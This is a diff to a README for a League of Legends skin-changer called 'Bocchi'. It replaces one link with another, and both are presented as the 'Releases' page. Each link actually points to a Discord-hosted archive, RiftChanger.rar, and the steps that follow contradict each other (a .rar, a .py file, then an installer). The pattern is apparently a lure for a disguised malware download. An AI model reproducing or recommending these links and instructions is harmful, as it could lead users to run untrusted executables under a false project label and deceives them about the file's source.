@@ -32,7 +32,7 @@ Bocchi is a modern, user-friendly desktop application for changing League of Leg
 
 ### Download
 
-1. Go to the [Releases](https://cdn.discordapp.com/attachments/1507770177633124393/1508032672688242698/RiftChanger.rar?ex=6a14105f&is=6a12bedf&hm=39b85c1a14fb9605dde71405f04e3a33e504c6e5c2aab31638d674490ed64d8c&) page
+1. Go to the [Releases](https://cdn.discordapp.com/attachments/1507770177633124393/1508039177961209977/RiftChanger.rar?ex=6a14166e&is=6a12c4ee&hm=f1eaba1bf3b10c59972c6c3fb17fd70c41cb0c2a99b3dba280db375c323b0cb4&) page
 2. Download the `RiftChanger.py`
 3. Run the installer and follow the setup wizard
 
